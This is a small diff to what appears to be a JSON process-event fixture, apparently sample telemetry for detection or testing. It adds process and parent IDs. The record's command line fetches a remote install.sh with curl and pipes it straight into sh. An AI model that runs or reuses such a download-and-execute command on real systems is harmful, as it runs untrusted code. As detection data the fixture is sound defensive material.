@@ -4,6 +4,8 @@
     "image": "/usr/bin/bash",
     "commandLine": "bash -c curl -s --max-time 2 http://192.0.2.10/install.sh | sh",
     "user": "1000",
+    "pid": 5400,
+    "ppid": 5399,
     "currentDirectory": "/home/u"
   }
 ]
